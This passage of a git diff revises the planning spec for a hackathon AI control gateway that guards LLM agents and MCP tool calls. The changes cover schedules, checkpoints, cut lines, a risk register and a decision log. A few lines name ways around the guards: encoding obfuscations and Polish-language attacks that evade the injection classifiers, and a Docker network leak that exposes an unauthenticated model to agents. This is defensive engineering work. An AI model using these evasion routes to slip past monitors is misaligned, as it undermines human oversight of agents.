+  Signatures normaliser destinations  :b3, 04:30, 240m
+  C07 PII                             :b6, 08:30, 60m
+  Threat queries feed service         :b5, 09:30, 180m
+  Integrity exports policy history    :b7, 12:30, 180m
+  Sleep                               :crit, bs, 15:30, 150m
+  Cases docs rehearsal                :b8, 18:00, 180m
   section C models and money
-  Ledger Lua latency spike            :c1, 01:00, 240m
-  Hygiene doctor guard sidecar        :c2, 05:00, 240m
+  Ledger Lua latency guard stub       :c1, 01:00, 240m
+  Hygiene guard sidecar and client    :c2, 05:00, 240m
   kNN topic pack race test            :c4, 09:00, 180m
-  Artifact gate spend P1 guard LLM    :c5, 12:00, 240m
-  Clean-room fixes eval               :c7, 16:00, 180m
-  Sleep                               :crit, cs, 19:00, 150m
+  Artifact gate spend seed            :c5, 12:00, 240m
+  Clean-room fixes eval               :c7, 16:00, 210m
+  Sleep                               :crit, cs, 19:30, 150m
   section D agents and MCP
   MCP spike core demo servers         :d1, 01:00, 180m
   Tools core and MCP call path        :d3, 04:00, 240m
   Taint provenance run state          :d4, 08:00, 180m
   Gate buffer                         :d9, 11:00, 60m
-  Pins honeypot servers validators    :d5, 12:00, 180m
-  P1 approvals C34                    :d6, 15:00, 60m
-  Sleep                               :crit, ds, 16:00, 180m
-  Cases rehearsal                     :d8, 19:00, 120m
+  Pins honeypot validators CLI        :d5, 12:00, 210m
+  Sleep                               :crit, ds, 15:30, 150m
+  Cases rehearsal                     :d8, 18:00, 180m
   section F console
   Brief and Claude Design             :f1, 00:30, 90m
-  Scaffold header Threats live        :f2, 02:00, 210m
+  Scaffold header Threats live        :f2, 02:00, 120m
+  Playground on fixtures              :f5, 04:00, 90m
   Sleep                               :crit, fs, 05:30, 180m
-  Drawer and Playground               :f3, 08:30, 330m
-  Overview spend panel                :f6, 14:00, 60m
-  Controls and Self-test              :f7, 15:00, 60m
+  Drawer                              :f3, 08:30, 180m
+  Playground live call                :f5b, 11:30, 60m
+  Overview spend panel                :f6, 12:30, 120m
+  Controls table and Run button       :f7, 14:30, 60m
   CSS screenshots video slides        :f8, 16:00, 300m
 ```
 
@@ -2003,22 +2108,22 @@ The gantt is indicative. The **checkpoint table below is binding**.
 
 | Checkpoint | Time | Green means | If red → decision (taken by L, no debate) |
 |---|---|---|---|
-| **CF** | H1:00 | `contracts/` committed (policy schema, audit schema with H1 deltas, detector protocol, OpenAPI ×2, SSE events, error contract, case schema, `frameworks.yaml`); CI green on stubs; **fence probe run on every demo Mac** and the result logged | contracts ship as-is and gaps go to a v1.1 RFC; a fence leak → fallback ladder §3.4 |
+| **CF** | H1:00 | `contracts/` committed (policy schema, audit schema with H1 deltas, detector protocol, OpenAPI ×2, SSE events, error contract, case schema, `frameworks.yaml` schema and format (content filled by L6 by H13)); CI green on stubs; **fence probe run on every demo Mac**, by name and raw IP, and the result logged | contracts ship as-is and gaps go to a v1.2 RFC; a fence leak → fallback ladder §3.4 |
 | **Latency** | H2:00 | C measured classifier/kNN p95 per window count on the demo Mac (`reports/perf-h2.md`) | apply the §5.1 H2 rule (engine/window size) |
 | **D1** | H2:30 | the MCP edge forwards `tools/call` to a sandbox HTTP server with our middleware | switch to the thin JSON-RPC proxy; middleware logic is framework-free |
 | **IC1** walking skeleton | H5:00 | `test_walking_skeleton.py` green (§13.5), tag `ic1` | L + A pair until green; the Overview spend panel drops to KPI tiles; UI stays on fixtures until IC3 |
 | **IC2** | H8:00 | streaming via the gateway against the mock (holdback may still be basic); real Valkey reserve/settle incl. 429; **`gw-2` behind `lb`, both shas in `/api/replicas`**; `/v1/runs` mints tokens and the fallback run works; one MCP `tools/call` blocked by a validator with an audit event; signature engine ≥ 5 rules; `guard /v1/inspect` (stub minimum); hot reload verdict flip < 2 s on 2/2 | streaming unstable → `stream_mode: buffer`; guard won't load → stub + "semantic tier degraded" shown honestly; feed signing broken → sha-pinned unsigned bundle, said openly |
 | **Placeholder** | H11:00 | name + tagline decided; title, team, description v1, PDF v0 uploaded (if the platform allows edits, checked at H0) | otherwise a checklist dry run |
-| **IC3 + H12 gate** | H12:00 | **detectors-off S4/S5 test green**, fence + admin isolation green, cross-replica race green; ≥ 85% of P0 cases green; `make test` ≤ 2 min warm; storyline beats 1, 2, 4 and 5 green offline; Threats + Playground on live data; tag `ic3` | gate red → **D + A + L swarm on C24 until green; all P1 frozen** |
+| **IC3 + H12 gate** | H12:00 | **detectors-off S4/S5 test green**, fence + admin isolation green, cross-replica race green; ≥ 85% of P0 cases green; `make test` ≤ 2 min warm; storyline beats 1, 2, 4 and 5 green offline (the static dev feed bundle is enough; the signed feed is first needed at IC4); Threats + drawer on live data; Playground on fixtures + one live call (fully live by IC4); tag `ic3` | gate red → **D + A + L swarm on C24 until green; all P1 frozen** |
 | **IC4** P0 complete | H15:00 | every P0 control enabled with ≥ 1 POS + ≥ 2 NEG passing; storyline beats 1-10 green offline; header + 4 pages on live data; tag `ic4` | any P0 control still red → flag off in the demo policy, dropped from slides. P1 continues only on lanes green here |
 | **Red-team swap** | H13:30-H14:30 | each pair attacks another lane's controls (A→D, D→B, B→C, C→A, L→all); every bypass becomes a case or a residual-register entry | — |
 | **Freeze** | H16:00 | P1 merged behind flags or abandoned; tag `rc1` | after this: fixes, cases, docs, policy/feed content and CSS only |
 | **IC5 clean room** | H17:30 | fresh `git clone` on the hot-spare laptop, Wi-Fi off: `make doctor && make test && make demo-offline && make demo`; storyline test 100% | each red item is a ≤ 30 min fix (by an awake owner or A/C) or a cut (flag off + slide edit) |
 | **Video** | H18:00 | 3-4 min recording of the full storyline + 20-40 s clips per beat (F + A) | — |
-| **PDF** | H18:45 v1 (L) · H20:30 v2 (L + F) | ≤ 10 slides, screenshots from `rc1` | — |
+| **PDF** | H17:00 v1 (L, before IC5 and L's nap) · H20:30 v2 (L + F) | ≤ 10 slides, screenshots from `rc1` | — |
 | **Repo public** | H20:00 | `gitleaks detect` clean on history; licences generated (`make licenses`); NOTICE | — |
 | **Submit** | H21:00 | PDF, repo public, video linked, tag `v1.0-submission`; a second person watching the screen; confirmation screenshot | — |
-| **Pitch prep** | H21-H24 | 3 rehearsals (F, B, D + A/C once awake); storyline test 10 min before stage | `main` locked |
+| **Pitch prep** | H21-H24 | 3 rehearsals (L, F, B, D; A and C join at H22); storyline test 10 min before stage | `main` locked |
 
 ### 13.5 Walking skeleton (IC1, H5): `tests/e2e/test_walking_skeleton.py`
 
@@ -2034,11 +2139,11 @@ The gantt is indicative. The **checkpoint table below is binding**.
 
 ### 13.6 Cut lines (cut in this order, never the reverse; each cut is a flag flip + slide edit)
 
-1. P1 ranks 16 → 7 (k8s, `/v1/guard`, agent→agent, n-gram, live agent, downgrade, Anthropic, C34, mutation, museum cards).
-2. Console: the Overview spend panel → KPI tiles; Controls → table + Run self-test; drawer MCP tab → Evidence.
+1. P1 ranks 17 → 7 (`package_ioc`, k8s, `/v1/guard`, agent→agent, n-gram, live agent, downgrade, Anthropic, C34, mutation, museum cards).
+2. Console: the Overview spend panel → KPI tiles; the Overview coverage grid → a list; drawer MCP tab → Evidence. (Controls is already a table + Run self-test since v1.1.)
 3. P1 ranks 6 → 4 (Spend/Agents pages, approvals, OCSF).
 4. C11 guard-LLM lane (the P0 topic pack + kNN still carry C11).
-5. Obfuscation matrix → base64 + tags + zero-width + Polish only.
+5. Obfuscation matrix → base64 + tags + zero-width + Polish only. (In force at P0 since v1.1: the mutators are P1 #8, and the hand-written cases cover these four.)
 6. C18 → pickle allowlist + fail-closed only (no torch zip, no safetensors header check).
 7. Multilingual kNN → EN+PL exemplars for the C09 keyword packs only (the classifier remains).
 
@@ -2047,37 +2152,41 @@ The gantt is indicative. The **checkpoint table below is binding**.
 - C01-C10, C12, C14-C17, C19, C20, C25, C26, C30, C32;
 - the hermetic `make test`, the live self-test, the header + Threats + Playground, the storyline test, offline mode, the two replicas and the race test.
 
-### 13.7 Sleep plan (3 h each, L 2.5 h + a nap; never more than two asleep; never an owner asleep at their own gate)
+### 13.7 Sleep plan (v1.1: F 3 h; A, B, C, D 2.5 h; L a 90-min nap; never more than two asleep; never an owner asleep at their own gate)
+
+These windows are for the base plan and plan (b) up to IC4. §13.4 gives the compressed windows for plan (a) and the shifted ones for (b).
 
 | Window | Asleep | Covered by |
 |---|---|---|
-| H5:30-H8:30 | F | UI on fixtures; the live Threats row for IC1 is wired before 05:30; F has nothing gated at IC2 (this is why F's lane is sized at 12.5 h) |
-| H16:00-H19:00 | B, D | after freeze. Clean-room items in their lanes → flag off, or fixed by A/C |
-| H19:00-H21:30 | A, C | after clean-room fixes and the video |
-| H21:30-H24:00 | L | after submission; a 30-min nap before IC3 if the gate is green early |
+| H5:30-H8:30 | F | UI on fixtures; the live Threats row for IC1 is wired before 05:30; F has nothing gated at IC2 (this is why F's lane is sized at 12.0 h) |
+| H15:30-H18:00 | B, D | right after IC4. Their lanes carry no P1 (13.5 h of P0 each), so they merge or abandon open work before sleeping. Clean-room items in their lanes → flag off, or fixed by A/C |
+| H18:00-H19:30 | L (nap) | after PDF v1 and the IC5 clean room; A, C and F are awake (video at H18:00 by F + A); no checkpoint falls in this window |
+| H19:30-H22:00 | A, C | after clean-room fixes and the video; they rejoin for the last rehearsal |
 
-L is awake at every checkpoint (CF → Submit). The other five sleep after their last gated deliverable.
+L is awake at every checkpoint (CF → Submit) and at every rehearsal (H21-H24), with an optional 30-min nap before IC3 if the gate is green early. The other five sleep after their last gated deliverable.
 
 ### 13.8 Working agreements and the pre-event checklist
 
 **Working agreements:**
 - **Trunk-based development.** Branches live < 2 h; PRs need unit + schema checks green; merge at least every 2 h; nobody pushes to `main` in the 15 minutes before a checkpoint.
-- **Stubs first.** By H1:30 every lane exposes its interface with a contract-shaped fake.
+- **Stubs first.** By H1:30 every lane exposes its interface with a contract-shaped fake. The IC1-critical stubs are due by H4.5 at the latest: B's rule-engine stub and static dev feed bundle file, and C's `GUARD_ENGINE=stub`.
+- **One base image (H1).** With the real `uv.lock`, L builds one `aicl-pybase` image (Python deps + `curl`, `netcat-openbsd`, `ca-certificates`), `docker save`s it to both USB sticks, and every service Dockerfile starts `FROM aicl-pybase`. After that, rebuilds only copy source, and `apt-get` is never needed offline.
 - **Flags.** Every new feature is a policy flag, default off until its cases pass.
 - **Tags.** The demo laptop runs a tag, never `main` (`ic1`, `ic2`, `ic3`, `rc1`, `v1.0-submission`).
 - **Stand-ups.** 15 minutes, only at checkpoints, run in front of `make demo-check` output (the storyline test), not opinions.
 
-**Pre-event checklist** (downloads and accounts only, no product code). **Executed, not planned:**
+**Pre-event checklist** (downloads, accounts, and design drafts as text or schema only; **product code starts at H0**, and whether pre-event design is allowed is Q16). **Executed, not planned:**
 - **Models:** pull `qwen3:8b`, `qwen3:4b` and `llama-guard3:1b` (Ollama ≥ 0.14) on both demo Macs.
 - **HF access:** request PG2 access for every team member.
 - **ONNX:** export protectai-v2, PG2-86M and multilingual MiniLM-L12 to INT8 ONNX once; store protectai-v2 and MiniLM-L12 as release assets (Apache-2.0, with NOTICE).
-- **Offline bundles:** `docker save` tarballs for base images, a wheelhouse (arm64 + amd64), the npm cache, tiktoken files and the eval datasets; put them on two USB sticks and the team drive.
-- **Mac setup:** check Docker Desktop memory ≥ 8 GB; draft the fence-probe script.
+- **Offline bundles:** `docker save` tarballs for base images, a wheelhouse (arm64 + amd64), the npm cache, tiktoken files and the eval datasets; put them on two USB sticks and the team drive. **The sticks are formatted exFAT**, because FAT32 cannot hold the `qwen3:8b` blob (> 4 GB).
+- **UI scaffold:** F generates the shadcn `dashboard-01` block (`npx shadcn@latest add dashboard-01`) **while online** and keeps the generated files, because the shadcn registry is online-only.
+- **Mac setup:** check Docker Desktop memory ≥ 8 GB; **disable Docker Model Runner** on demo Macs (it is unauthenticated and reachable from containers at `model-runner.docker.internal`), or add it to the fence-probe targets; draft the fence-probe script so it tests every host target **by name and by raw host IP** (the `extra_hosts` override only renames hosts).
 - **Rehearsal:** run with Wi-Fi off on one Mac.
 
 ### 13.9 Submission package
 
-- **Title:** "Mandate: agents get mandates, not keys (AI Control Layer)". Name and description go in at H11 and are final at H21.
+- **Title:** "Mandate: agents get mandates, not keys (AI Control Layer)". Name and description go in at H11 and are final at H21 (plan (a): H8 and H15, §13.4).
 - **Description:** three lengths: a one-liner (§1.2), 100 words, 300 words.
 - **10-slide PDF:**
   1. title + one-liner + team;
@@ -2102,7 +2211,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | # | Risk | L | I | Mitigation | Trigger / owner |
 |---|---|---|---|---|---|
 | R1 | Docker Desktop leaks `host.docker.internal` from `internal: true` networks, giving unauthenticated Ollama to agents | M | **Critical** | Probe at H1 on every Mac; fallback ladder (§3.4); never claim what the probe doesn't prove | H1 / L |
-| R2 | Scope overrun (P0 ≈ 85% of capacity, ~82 h) | H | H | Ranked cut lines, flags, IC gates, P1 only on green lanes, "no case, no merge" | every IC / L |
+| R2 | Scope overrun (P0 ≈ 98% of capacity: ~79.5 h of 81 h; plan (a) has only ~54 h) | H | H | Ranked cut lines, flags, IC gates, P1 only on green lanes, "no case, no merge" | every IC / L |
 | R3 | C24/C33 taint + provenance late, putting the headline guarantee at risk | M | **Critical** | D starts D4 by H8; the extractor comes from B by H7; the H12 gate swarm rule; C14 email allowlist as the deterministic backstop | H12 / D |
 | R4 | Streaming proxy complexity (SSE, holdback, tool-call deltas) | M | H | Non-stream skeleton; `stream_mode: buffer` fallback; mock-driven stream tests from H5 | IC2 / A |
 | R5 | FastMCP 4 API differs from the docs; MCP SDK 2.x renamed FastMCP to MCPServer (FACT-CHECK B2) | M | H | Spike with a hard gate at H2.5; thin JSON-RPC fallback; our demo servers speak plain Streamable HTTP | H2.5 / D |
@@ -2111,18 +2220,18 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | R8 | Drift between six people and six AI assistants | H | H | Contracts frozen at H1, CODEOWNERS, CI schema tests on fixtures/events/policies, CLAUDE.md, merge every 2 h | CF onward / L |
 | R9 | One UI person is the bottleneck | M | H | Fixtures at H1:30, 4 pages + header, read API split across L/B/C, cut order, polling fallback, early sleep slot | IC2 / F |
 | R10 | Hot reload flaky on bind mounts; replicas diverge | M | H | Directory watch + 1 s sha poll; heartbeat truth; divergence alert; test asserts 2/2 | IC2 / A |
-| R11 | A judge's ReDoS / YAML bomb / typo crashes or silently weakens policy | M | H | RE2 only, size/node/alias limits, `extra="forbid"`, LKG, `control_weakened` | A / B |
+| R11 | A judge's ReDoS / YAML bomb / typo crashes or silently weakens policy | M | H | RE2 only (linear time, so ReDoS patterns are harmless; non-RE2 syntax is rejected), size/node/alias limits, `extra="forbid"`, LKG, `control_weakened` | A / B |
 | R12 | Local LLM tool calling flaky on stage | H | M | Scripted agent is the default; live mode is a bonus; assert on audit events | D |
 | R13 | Mentor machines (x86, Windows, no make, no Ollama, no HF token) | M | H | Hermetic compose, raw command, multi-arch base images, ungated ONNX from release assets, `mock-llm`, `make doctor`, published cold-start time | L |
 | R14 | Polish and adaptive attacks get past the classifiers | H | M | Don't claim it; taint/provenance carry the guarantee; measured slices only (`make eval`) | C |
 | R15 | RAM pressure on the demo Mac (qwen3:8b + guard lane + ~10 containers) | M | M | 32 GB+, Docker ≥ 8 GB, `make doctor`, guard lane only when P1 is on, `KEEP_ALIVE=-1` warmed | C |
 | R16 | Valkey is a single point of failure | L | H | Fail-mode table; recorded drill; AOF volume | C |
 | R17 | Fatigue errors late at night | H | M | Sleep plan, freeze at H16, tags, "flag off, not code" after H18 | L |
-| R18 | Deadline (AM/PM) or weights (15/15 vs 20/10) ambiguity | L | H | Confirm at H0; submit at H21 regardless; test suite is first-class either way | L |
+| R18 | Deadline (AM/PM) or weights (15/15 vs 20/10) ambiguity | **H** | H | Confirm at H0; until confirmed in writing, run plan (a) of §13.4 (submit at H15); test suite is first-class either way | L |
 | R19 | Licence contamination | L | M | No GPL/AGPL in our images (no Squid, Grafana or Open WebUI); `make licenses` fails on GPL/AGPL/SSPL; Llama attribution in NOTICE if PG2/LG3 ship | L |
 | R20 | OWASP MCP Top 10 renumbered by its October 2026 release | M | L | All IDs live in `frameworks.yaml`; re-check at H0 | L |
 | R21 | GitHub push protection blocks secret fixtures | M | L | Fixtures generated at runtime | B |
-| R22 | DuckDB reading JSONL while writers append | M | M | `control` reads only complete lines (tail offset); daily files; queries over a snapshot list | F / B |
+| R22 | DuckDB reading JSONL while writers append | M | M | `control` reads only complete lines (tail offset); daily files; queries over a snapshot list | L / B (L3's audit tailer, B7's DuckDB queries; not a UI risk) |
 | R23 | Gated PG2 weights unavailable on a demo laptop | M | L | protectai-v2 default baked; the header shows the engine honestly; multilingual kNN still covers PL exemplars | C |
 
 ### 14.2 Residual threat register (closing slide: what Mandate does **not** stop)
@@ -2153,7 +2262,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | # | Question | Default if unanswered | By |
 |---|---|---|---|
 | Q1 | Brand: **Mandate**, or another candidate from §1.1? | Mandate | H11 |
-| Q2 | Deadline wording (11 PM vs 11 AM), CRITERIA vs RULES weights, can submissions be edited after upload? | submit at H21; placeholder at H11 | H0 |
+| Q2 | Deadline wording (11 PM vs 11 AM), CRITERIA vs RULES weights, can submissions be edited after upload? | plan (a) of §13.4 until confirmed (placeholder H8, submit H15) | H0 |
 | Q3 | Which Mac is the primary demo machine and which is the hot spare? Docker Desktop versions? Fence probe result on both? | the two 64 GB machines, if any | H1 |
 | Q4 | Did every demo laptop get PG2 HF access? | protectai-v2 default + multilingual kNN | H0 |
 | Q5 | Qwen3Guard-Gen-0.6B community GGUF spike: go or no-go vs `llama-guard3:1b` for the P1 guard lane? | `llama-guard3:1b` (official tag) | H2 |
@@ -2167,6 +2276,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | Q13 | Is a single shared admin token for the console acceptable at P0 (no per-user admin identity)? | yes, with the banner "single admin token (demo)" | H1 |
 | Q14 | Reset timezone: UTC (vendor convention) or Europe/Warsaw? | UTC | H1 |
 | Q15 | Has the OWASP MCP Top 10 October 2026 release renumbered anything? | keep 2025-edition IDs | H0 |
+| Q16 | Rule compliance (ask the organisers with Q2): is pre-event design allowed? We bring this spec, research notes and text/schema drafts of `contracts/`, but no product code; code starts at H0 | design docs are allowed; if not, L writes `contracts/` from scratch in H0-H1 and CF may slip to H1:30 | H0 |
 
 ---
 
@@ -2192,7 +2302,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | D16 | Per-replica chain + **control-signed checkpoints in a witness volume** at P0; Merkle/C2SP at P2 | unanchored chain | J1 must-fix 11 |
 | D17 | Feed: **explicit `feedctl publish`**; `last_serial` persisted per key in Valkey; local overrides tighten-only and tagged `origin: local-unsigned`; unknown types skipped | auto-sign on save (P5); unpersisted serial (all) | J1 must-fix 12 |
 | D18 | **One test harness** (hermetic compose); the live self-test reuses the same case library and runner core | + in-process `test-fast` (P1) | J3 must-fix 5 |
-| D19 | **4 console pages + header** at P0, with spend as a P0 panel on Overview; the full Spend page is P1 | 9-11 pages (P2, P3, brief); 5 pages incl. Spend (earlier draft) | J2 must-fix 12, J3 must-fix 6 (J3's Overview layout); keeps the single UI lane at 12.5 h so F can sleep early |
+| D19 | **4 console pages + header** at P0, with spend as a P0 panel on Overview; the full Spend page is P1 | 9-11 pages (P2, P3, brief); 5 pages incl. Spend (earlier draft) | J2 must-fix 12, J3 must-fix 6 (J3's Overview layout); keeps the single UI lane at 12.5 h (12.0 h in v1.1) so F can sleep early |
 | D20 | Identity at P0 = hashed virtual keys + **JWT/JWKS static demo issuer** with `group_map`; Keycloak/LDAP = P2 profile + slide | live Keycloak device flow (P3) | J2 must-fix 11; J1/J3 cut Keycloak |
 | D21 | Compute-ms = wall clock at P0; native `/api/chat` durations at P1 | Ollama durations through `/v1` | FACT-CHECK A2, J2 X3 |
 | D22 | `Server-Timing` = pre-flight only; upstream/stream timings in audit + trailing SSE comment | upstream in header | J2 X4, must-fix 9 |
@@ -2245,7 +2355,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
 | Streaming contract (Server-Timing pre-flight, holdback, shield, no TCP reset, mutate in place) (J2-9) | §5.5, §5.7, D22/D23 | P0 |
 | Fail-mode table + rehearsed drills (J2-10) | §5.4, D44 | P0 |
 | Identity = real JWT/JWKS path + hashed virtual keys (J2-11) | C01, §6.2 `issuers`, D20 | P0 |
-| Honest scope, ≤ 6 console surfaces (J2-12, J3-1/6) | §13.2 (~82 h, H12 critical path), §9.5 (4 pages + header + spend panel) | — |
+| Honest scope, ≤ 6 console surfaces (J2-12, J3-1/6) | §13.2 (~79.5 h of 81 h, H12 critical path), §9.5 (4 pages + header + spend panel) | — |
 | Single policy writer (J2-13, J3-7) | §6.1, D14 | P0 / P1 toggles |
 | Audit backpressure per profile (J2-15) | §5.4, D43 | P0 |
 | Phase-1 path without Ollama, HF token or internet; ungated default classifier (J3-4) | §3.7 modes, D09, §10.1 | P0 |
@@ -2269,7 +2379,7 @@ L is awake at every checkpoint (CF → Submit). The other five sleep after their
    - placeholders as in §11.6.
 3. `examples/feed/signatures.yaml`:
    - SIG-0002 lookahead regex (not RE2) → `url_ioc`;
-   - SIG-0008 `yara` → `regex` over the template (P1);
+   - SIG-0008 `yara` → `regex` over the template (`match.field`, tier P2);
    - OWASP tags with edition suffixes;
    - `applies_to` mapped to the §8.1 vocabulary (`egress_http`/`ingress_http` → `http_request`, `agent_tools` → run; `process_args`/`filesystem_event` are skipped);
    - add SIG-0016..0020.
